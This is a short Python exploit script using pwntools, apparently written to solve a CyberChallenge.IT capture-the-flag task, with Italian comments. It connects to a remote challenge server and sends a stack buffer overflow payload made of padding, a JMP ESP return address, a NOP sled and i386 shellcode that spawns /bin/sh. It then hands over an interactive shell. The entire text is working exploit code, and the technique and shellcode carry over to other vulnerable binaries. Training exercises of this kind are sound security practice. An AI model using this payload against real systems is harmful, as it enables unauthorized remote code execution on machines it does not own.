from pwn import *

context.arch = 'i386'
# Indirizzo JMP ESP che hai trovato tu
jmp_esp = 0x08048593 

r = remote('shell.challs.cyberchallenge.it', 9123)

# Shellcode (23 byte)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Payload: [OFFSET] + [JMP ESP] + [NOP SLED] + [SHELLCODE]
# Proviamo a pulire l'input con un newline e poi mandare il comando
payload = b"A" * 44 + p32(jmp_esp) + b"\x90" * 32 + shellcode

r.recvuntil(b"> ")
r.sendline(payload)

r.interactive()
